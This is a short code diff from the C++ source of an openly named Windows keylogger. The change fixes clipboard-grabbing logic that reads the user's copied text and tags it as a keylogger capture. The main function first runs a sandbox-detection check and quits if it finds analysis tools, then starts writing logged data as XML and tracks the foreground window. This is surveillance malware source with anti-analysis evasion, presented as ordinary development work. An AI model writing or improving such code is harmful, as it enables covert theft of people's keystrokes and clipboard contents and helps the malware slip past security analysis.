@@ -103,6 +103,7 @@ FORCEINLINE int grabclipboard()
             char* this_cb_data;
             HANDLE cb_lock_handle = GetClipboardData(CF_TEXT);
             if(cb_lock_handle)
+                {
                 this_cb_data=(char*)GlobalLock(cb_lock_handle);
                 if(!strlen(this_cb_data))
                 {
@@ -123,18 +124,18 @@ FORCEINLINE int grabclipboard()
                     "\n\t\t\t\t<CaptureType>Keylogger</CaptureType>\n\t\t\t\t<Capture><![CDATA[" ;
                 }
                 GlobalUnlock(cb_lock_handle);
-                CloseClipboard();
+                }
+            CloseClipboard();
+
+
         }
     return 0;
 }
 
 int main()
 {
+
     if(SandBoxDetection()) return SandBoxedInstance;
-
-
-    char WD_[MAX_PATH];
-    GetModuleFileName(NULL,WD_,MAX_PATH);
 
     cout << "<?xml version=\"1.0\" encoding=\"utf-8\"?>\n<?xml-stylesheet type=\"text/xsl\" href=\"keyloggerStyle.xsl\"?>\n<KeyLoggerMetaData>\n";
     HWND CURRENTPROCEESS=GetForegroundWindow();
